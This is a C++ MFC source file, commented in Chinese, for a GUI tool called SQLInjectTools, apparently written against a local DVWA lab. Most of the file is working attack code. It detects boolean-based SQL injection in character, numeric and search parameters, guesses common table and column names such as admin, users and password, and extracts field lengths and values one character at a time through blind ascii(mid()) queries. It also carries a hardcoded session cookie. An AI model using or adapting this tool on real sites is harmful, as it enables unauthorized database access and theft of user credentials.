
// SQLInjectToolsDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "SQLInjectTools.h"
#include "SQLInjectToolsDlg.h"
#include "afxdialogex.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CSQLInjectToolsDlg 对话框



CSQLInjectToolsDlg::CSQLInjectToolsDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CSQLInjectToolsDlg::IDD, pParent)
    , m_strSign(_T(""))
    , m_nSel(0)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CSQLInjectToolsDlg::DoDataExchange(CDataExchange* pDX)
{
    CDialogEx::DoDataExchange(pDX);
    DDX_Control(pDX, IDC_LIST1, m_ScanList);
}

BEGIN_MESSAGE_MAP(CSQLInjectToolsDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
    ON_BN_CLICKED(IDC_BUTTON1, &CSQLInjectToolsDlg::OnBnClickedButton1)
    ON_WM_CLOSE()
    ON_BN_CLICKED(IDC_RADIO1, &CSQLInjectToolsDlg::OnBnClickedRadio1)
    ON_BN_CLICKED(IDC_RADIO2, &CSQLInjectToolsDlg::OnBnClickedRadio2)
    ON_BN_CLICKED(IDC_RADIO3, &CSQLInjectToolsDlg::OnBnClickedRadio3)
    ON_BN_CLICKED(IDC_BUTTON2, &CSQLInjectToolsDlg::OnBnClickedButton2)
    ON_BN_CLICKED(IDC_BUTTON3, &CSQLInjectToolsDlg::OnBnClickedButton3)
    ON_BN_CLICKED(IDC_BUTTON4, &CSQLInjectToolsDlg::OnBnClickedButton4)
    ON_BN_CLICKED(IDC_BUTTON5, &CSQLInjectToolsDlg::OnBnClickedButton5)
END_MESSAGE_MAP()


// CSQLInjectToolsDlg 消息处理程序

BOOL CSQLInjectToolsDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码
    m_ScanList.InsertColumn(0, "扫描结果");
    m_ScanList.SetColumnWidth(0, 400);

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    m_nSel = -1;

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CSQLInjectToolsDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CSQLInjectToolsDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CSQLInjectToolsDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CSQLInjectToolsDlg::OnBnClickedButton1()
{
    // TODO: 在此添加控件通知处理程序代码
    CString strUrl;
    GetDlgItemText(IDC_EDIT1, strUrl);

    GetDlgItemText(IDC_EDIT2, m_strSign);

    DWORD dwServiceType;    // 服务类型
    CString strServer;      // 服务器地址
    CString strObject;      // URL指向的对象
    INTERNET_PORT nPort;    // 端口号

    AfxParseURL(strUrl, dwServiceType, strServer, strObject, nPort);

    CheckInject(strServer, strObject, nPort);
}

// 字符型
char *pCharText[] = 
{
    "%27+and+%271%27=%271",
    "%27+and+%271%27=%272"
};
// 数值型
char *pNumText[] = 
{
    " and 1=1",
    " and 1=2"
};
// 搜索型 
char *pSearchText[] = 
{
    "%25%27+and+1=1+and+%27%25%27=%27%25",
    "%25%27+and+1=2+and+%27%25%27=%27%25"
};

void CSQLInjectToolsDlg::CheckInject(CString strServer, CString strObject, INTERNET_PORT nPort)
{
    CString strUrl;
    strUrl = "http://" + strServer + strObject;

    switch ( m_nSel )
    {
        case 1:
        {
            m_ScanList.InsertItem(m_ScanList.GetItemCount(), "测试字符型");
            if ( Check(strServer, strObject, pCharText[0], pCharText[1]) )
            {
                strUrl = strUrl + "[存在]";
            }
            else
            {
                strUrl = strUrl + "[不存在]";
            }
            break;
        }
        case 2:
        {
            m_ScanList.InsertItem(m_ScanList.GetItemCount(), "测试数值型");
            if ( Check(strServer, strObject, pNumText[0], pNumText[1]) )
            {
                strUrl = strUrl + "[存在]";
            }
            else
            {
                strUrl = strUrl + "[不存在]";
            }
            break;
        }
        case 3:
        {
            m_ScanList.InsertItem(m_ScanList.GetItemCount(), "测试搜索型");
            if ( Check(strServer, strObject, pSearchText[0], pSearchText[1]) )
            {
                strUrl = strUrl + "[存在]";
            }
            else
            {
                strUrl = strUrl + "[不存在]";
            }
            break;
        }
        default:
        {
            AfxMessageBox("请选择测试类型!!");
            break;
        } 
    }

    m_ScanList.InsertItem(m_ScanList.GetItemCount(), strUrl);
    // closesocket(m_sock);
}

BOOL CSQLInjectToolsDlg::Check(CString strServer, CString strObject, CString str11, CString str12)
{
    BOOL bRet = FALSE;

    char szSendPacket[1024] = { 0 };
    char szRecvPacket[0x2048] = { 0 };
    CString strUrl;
    m_sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

    sockaddr_in ServerAddr = { 0 };
    ServerAddr.sin_family = AF_INET;
    ServerAddr.sin_port = htons(80);
    ServerAddr.sin_addr.S_un.S_addr = inet_addr(strServer);

    connect(m_sock, (const sockaddr *)&ServerAddr, sizeof(ServerAddr));
    // 测试真
    strUrl = strObject + str11;
    HttpGet(szSendPacket, strUrl.GetBuffer(0), strServer.GetBuffer(0));

    send(m_sock, szSendPacket, strlen(szSendPacket), 0);
    recv(m_sock, szRecvPacket, 0x2048, 0);
    CString strPacket_11 = szRecvPacket;

    closesocket(m_sock);

    m_sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    connect(m_sock, (const sockaddr *)&ServerAddr, sizeof(ServerAddr));
    // 测试假
    strUrl = strObject + str12;
    ZeroMemory(szSendPacket, 1024);
    ZeroMemory(szRecvPacket, 0x2048);
    HttpGet(szSendPacket, strUrl.GetBuffer(0), strServer.GetBuffer(0));

    send(m_sock, szSendPacket, strlen(szSendPacket), 0);
    recv(m_sock, szRecvPacket, 0x2048, 0);

    CString strPacket_12 = szRecvPacket;

    closesocket(m_sock);
    if ( strPacket_11.Find(m_strSign) != -1 && strPacket_12.Find(m_strSign) == -1 )
    {
        bRet = TRUE;
    }

    return bRet;
}

void CSQLInjectToolsDlg::HttpGet(char* strGetPacket, char* strUrl, char* strHost)
{
    wsprintf(strGetPacket, "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
        "Upgrade-Insecure-Requests: 1\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\r\n"
        "Referer: http://localhost/dvwa-1.9/vulnerabilities/sqli/\r\n"
        "Accept-Encoding: gzip, deflate, sdch\r\n"
        "Accept-Language: zh-CN,zh;q=0.8\r\n"
        "Cookie: security=low; pgv_pvi=8928542720; Hm_lvt_0a8b0d0d0f05cb8727db5cc8d1f0dc08=1505118977; a5787_times=1; a3564_times=1; pageNo=1; pageSize=30; Hm_lvt_82116c626a8d504a5c0675073362ef6f=1508373269,1508719861,1508806033,1508821087; PHPSESSID=jn0pc2a4eubcd400m4bh6nv1n2\r\n"
        "Connection: close\r\n\r\n", strUrl, strHost);
}


void CSQLInjectToolsDlg::OnClose()
{
    // TODO: 在此添加消息处理程序代码和/或调用默认值
    WSACleanup();

    CDialogEx::OnClose();
}

void CSQLInjectToolsDlg::OnBnClickedRadio1()
{
    // TODO: 在此添加控件通知处理程序代码
    m_nSel = 1;
}


void CSQLInjectToolsDlg::OnBnClickedRadio2()
{
    // TODO: 在此添加控件通知处理程序代码
    m_nSel = 2;
}


void CSQLInjectToolsDlg::OnBnClickedRadio3()
{
    // TODO: 在此添加控件通知处理程序代码
    m_nSel = 3;
}

// 猜表名
char tables[][MAXBYTE] = { "admin", "manage", "users", "user", "guestbook", "note"};

void CSQLInjectToolsDlg::OnBnClickedButton2()
{
    // TODO: 在此添加控件通知处理程序代码
    CString strUrl;
    GetDlgItemText(IDC_EDIT1, strUrl);
    GetDlgItemText(IDC_EDIT2, m_strSign);

    DWORD dwServiceType;    // 服务类型
    CString strServer;      // 服务器地址
    CString strObject;      // URL指向的对象
    INTERNET_PORT nPort;    // 端口号

    AfxParseURL(strUrl, dwServiceType, strServer, strObject, nPort);

    int nTable = sizeof(tables) / MAXBYTE;
    m_ScanList.InsertItem(m_ScanList.GetItemCount(), "开始猜表名");
    for ( int i = 0; i < nTable; i++ )
    {
        CString strUrl_1;
        // and (select count(*) from user) > 0
        strUrl_1.Format("%s%%27+and+exists%%28select+*+from+%s%%29+and+%%271%%27=%%271", strObject, tables[i]);
        m_sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

        sockaddr_in ServerAddr = { 0 };
        ServerAddr.sin_family = AF_INET;
        ServerAddr.sin_port = htons(80);
        ServerAddr.sin_addr.S_un.S_addr = inet_addr(strServer);
        connect(m_sock, (const sockaddr *)&ServerAddr, sizeof(ServerAddr));

        char szSendPacket[1024] = { 0 };
        char szRecvPacket[0x2048] = { 0 };
        HttpGet(szSendPacket, strUrl_1.GetBuffer(0), strServer.GetBuffer(0));

        send(m_sock, szSendPacket, strlen(szSendPacket), 0);
        recv(m_sock, szRecvPacket, 0x2048, 0);

        CString strPacket;
        strPacket = szRecvPacket;
        CString tab = tables[i];
        if ( strPacket.Find(m_strSign) != -1 )
        {
            tab = tab + "[存在该表]";
        }

        m_ScanList.InsertItem(m_ScanList.GetItemCount(), tab);

        closesocket(m_sock);
    }
    m_ScanList.InsertItem(m_ScanList.GetItemCount(), "结束猜表名");
}

char columns[][MAXBYTE] = { "id", "user", "username", "pass", "pwd", "password"};
void CSQLInjectToolsDlg::OnBnClickedButton3()
{
    // TODO: 在此添加控件通知处理程序代码
    CString strTable;
    CString strUrl;

    GetDlgItemText(IDC_EDIT1, strUrl);
    GetDlgItemText(IDC_EDIT2, m_strSign);
    GetDlgItemText(IDC_EDIT3, strTable);    // 获取猜解表名

    DWORD dwServiceType;    // 服务类型
    CString strServer;      // 服务器地址
    CString strObject;      // URL指向的对象
    INTERNET_PORT nPort;    // 端口号

    AfxParseURL(strUrl, dwServiceType, strServer, strObject, nPort);

    int nColumns = sizeof(columns) / MAXBYTE;
    m_ScanList.InsertItem(m_ScanList.GetItemCount(), "开始猜列名");
    for ( int i = 0; i < nColumns; i++ )
    {
        CString strUrl_1;
        // and (select count(id) from user) > 0
        strUrl_1.Format("%s%%27+and+%%28select+count%%28%s%%29+from+%s%%29>0+and+%%271%%27=%%271", strObject, columns[i], strTable);
        m_sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

        sockaddr_in ServerAddr = { 0 };
        ServerAddr.sin_family = AF_INET;
        ServerAddr.sin_port = htons(80);
        ServerAddr.sin_addr.S_un.S_addr = inet_addr(strServer);
        connect(m_sock, (const sockaddr *)&ServerAddr, sizeof(ServerAddr));

        char szSendPacket[1024] = { 0 };
        char szRecvPacket[0x2048] = { 0 };
        HttpGet(szSendPacket, strUrl_1.GetBuffer(0), strServer.GetBuffer(0));

        send(m_sock, szSendPacket, strlen(szSendPacket), 0);
        recv(m_sock, szRecvPacket, 0x2048, 0);

        CString strPacket;
        strPacket = szRecvPacket;
        CString col = columns[i];
        if ( strPacket.Find(m_strSign) != -1 )
        {
            col = col + "[存在该列]";
        }

        m_ScanList.InsertItem(m_ScanList.GetItemCount(), col);

        closesocket(m_sock);
    }
    m_ScanList.InsertItem(m_ScanList.GetItemCount(), "结束猜列名");
}


void CSQLInjectToolsDlg::OnBnClickedButton4()
{
    // TODO: 在此添加控件通知处理程序代码
    CString strTable;
    CString strField;
    CString strUrl;
    CString strNum;

    GetDlgItemText(IDC_EDIT1, strUrl);
    GetDlgItemText(IDC_EDIT2, m_strSign);
    GetDlgItemText(IDC_EDIT3, strTable);    // 获取猜解表名
    GetDlgItemText(IDC_EDIT4, strField);    // 列名
    GetDlgItemText(IDC_EDIT5, strNum);      // 猜解第几行

    DWORD dwServiceType;    // 服务类型
    CString strServer;      // 服务器地址
    CString strObject;      // URL指向的对象
    INTERNET_PORT nPort;    // 端口号

    AfxParseURL(strUrl, dwServiceType, strServer, strObject, nPort);
    m_ScanList.InsertItem(m_ScanList.GetItemCount(), "开始猜列值长度");
    // 求长度
    int nLen = 1;
    while ( nLen <= 64 )
    {
        CString strUrl_1;
        // and (select length(username) from user limit 1) = 5
        strUrl_1.Format("%s%%27+and+%%28select+length%%28%s%%29+from+%s+limit+%s%%2C1%%29=%d+and+%%271%%27=%%271", strObject, strField, strTable, strNum, nLen);

        m_sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
        sockaddr_in ServerAddr = { 0 };
        ServerAddr.sin_family = AF_INET;
        ServerAddr.sin_port = htons(80);
        ServerAddr.sin_addr.S_un.S_addr = inet_addr(strServer);
        connect(m_sock, (const sockaddr *)&ServerAddr, sizeof(ServerAddr));

        char szSendPacket[1024] = { 0 };
        char szRecvPacket[0x2048] = { 0 };
        HttpGet(szSendPacket, strUrl_1.GetBuffer(0), strServer.GetBuffer(0));

        send(m_sock, szSendPacket, strlen(szSendPacket), 0);
        recv(m_sock, szRecvPacket, 0x2048, 0);

        CString strPacket;
        strPacket = szRecvPacket;
        if ( strPacket.Find(m_strSign) != -1 )
        {
            closesocket(m_sock);
            break;
        }

        closesocket(m_sock);

        nLen ++;
    }
    CString num;
    num.Format("%d", nLen);
    m_ScanList.InsertItem(m_ScanList.GetItemCount(), num);
    m_ScanList.InsertItem(m_ScanList.GetItemCount(), "结束猜列值长度");
}

void CSQLInjectToolsDlg::OnBnClickedButton5()
{
    // TODO: 在此添加控件通知处理程序代码
    CString strTable;
    CString strField;
    CString strUrl;
    CString strNum;
    int     nLen;

    GetDlgItemText(IDC_EDIT1, strUrl);
    GetDlgItemText(IDC_EDIT2, m_strSign);
    GetDlgItemText(IDC_EDIT3, strTable);    // 获取猜解表名
    GetDlgItemText(IDC_EDIT4, strField);    // 列名
    GetDlgItemText(IDC_EDIT5, strNum);      // 猜解第几行
    nLen = GetDlgItemInt(IDC_EDIT6);

    DWORD dwServiceType;    // 服务类型
    CString strServer;      // 服务器地址
    CString strObject;      // URL指向的对象
    INTERNET_PORT nPort;    // 端口号

    AfxParseURL(strUrl, dwServiceType, strServer, strObject, nPort);
    m_ScanList.InsertItem(m_ScanList.GetItemCount(), "开始猜列值");

    CString strValue;
    int i = 1;
    CString username;
    // 长度用于猜解每一位
    while ( i <= nLen )
    {
        // 这里猜解只猜解小写的字母
        // 这里在实际的时候需要改成各种可能的字符
        for ( int c = 97; c < 122; c ++ )
        {
            CString strUrl_1;
            // and (select ascii(mid(username, 1, 1)) from user limit 1) = 97
            strUrl_1.Format("%s%%27+and+%%28select+ascii%%28mid%%28%s,%d,1%%29%%29+from+%s+limit+%s,1%%29=%d+and+%%271%%27=%%271",
                strObject, strField, i, strTable, strNum, c);
            
            m_sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
            sockaddr_in ServerAddr = { 0 };
            ServerAddr.sin_family = AF_INET;
            ServerAddr.sin_port = htons(80);
            ServerAddr.sin_addr.S_un.S_addr = inet_addr(strServer);
            connect(m_sock, (const sockaddr *)&ServerAddr, sizeof(ServerAddr));

            char szSendPacket[1024] = { 0 };
            char szRecvPacket[0x2048] = { 0 };
            HttpGet(szSendPacket, strUrl_1.GetBuffer(0), strServer.GetBuffer(0));

            send(m_sock, szSendPacket, strlen(szSendPacket), 0);
            recv(m_sock, szRecvPacket, 0x2048, 0);

            CString strPacket;
            strPacket = szRecvPacket;
            if ( strPacket.Find(m_strSign) != -1 )
            {
                // 拼接猜解的每一位用户名
                username.Format("%s%c", username, c);
                closesocket(m_sock);
                break;
            }

            closesocket(m_sock);
        }

        i ++;
    }

    username = username + "[猜解结果]";
    m_ScanList.InsertItem(m_ScanList.GetItemCount(), username);
    m_ScanList.InsertItem(m_ScanList.GetItemCount(), "结束猜列值");
}
